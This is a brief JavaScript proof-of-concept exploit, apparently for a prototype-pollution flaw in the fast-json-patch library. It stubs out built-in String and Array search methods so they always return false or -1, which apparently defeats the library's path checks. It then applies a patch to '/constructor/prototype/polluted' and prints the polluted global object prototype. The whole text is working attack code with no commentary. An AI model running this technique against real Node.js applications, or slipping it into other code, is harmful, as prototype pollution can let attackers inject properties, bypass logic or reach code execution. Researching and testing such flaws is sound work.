String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
let fp = require('fast-json-patch');
const patch = [{
        op: 'replace',
        path: '/constructor/prototype/polluted',
        value: 'yes'
    }];
console.log({}.polluted);
fp.applyPatch({}, patch);
console.log({}.polluted);